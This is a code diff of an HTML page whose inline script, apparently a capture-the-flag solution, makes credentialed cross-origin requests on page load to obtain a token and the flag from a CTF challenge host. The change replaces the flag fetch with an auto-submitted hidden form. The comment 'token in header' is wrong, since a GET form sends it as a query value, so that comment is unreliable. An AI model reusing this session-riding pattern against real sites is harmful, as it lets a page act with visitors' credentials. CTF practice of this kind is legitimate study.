@@ -15,7 +15,7 @@
 
   <script>
     const out = document.getElementById('output');
-    const log = (msg) => out.textContent += msg + "\n";
+    const log = msg => out.textContent += msg + "\n";
 
     async function call(path, init) {
       const res = await fetch(path, { credentials: 'include', ...init });
@@ -23,7 +23,6 @@
       return { status: res.status, text, json: () => JSON.parse(text) };
     }
 
-    // Automatically fetch flag on page load
     (async () => {
       log("Starting...");
 
@@ -40,11 +39,21 @@
       catch (e) { log("Failed to parse token"); return; }
       log(`Token: ${token}`);
 
-      // 3️⃣ Fetch flag
-      const flagRes = await call('https://web200-1.pointeroverflowctf.com/api/flag', {
-        headers: { 'X-Flag-Token': token }
-      });
-      log(`Flag: ${flagRes.text}`);
+      // 3️⃣ Redirect browser to /api/flag with token in header
+      log("Redirecting to flag...");
+      const form = document.createElement('form');
+      form.method = 'GET';
+      form.action = 'https://web200-1.pointeroverflowctf.com/api/flag';
+      form.target = '_self';
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'X-Flag-Token';
+      input.value = token;
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
     })();
   </script>
 </body>
